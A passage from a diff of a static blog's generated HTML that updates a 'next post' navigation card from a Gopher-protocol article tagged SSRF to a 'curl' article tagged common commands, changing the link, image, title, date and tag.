                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/25/Gopher%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/">
+                <a href="/2021/08/27/curl/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.png" class="responsive-img" alt="Gopher协议深度理解">
+                        <img src="/medias/featureimages/17.png" class="responsive-img" alt="curl">
                         
-                        <span class="card-title">Gopher协议深度理解</span>
+                        <span class="card-title">curl</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1133,7 +1130,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-27
                             </span>
                         <span class="publish-author">
                             
@@ -1146,8 +1143,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SSRF/">
-                        <span class="chip bg-color">SSRF</span>
+                    <a href="/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
+                        <span class="chip bg-color">常用命令</span>
                     </a>
                     
                 </div>
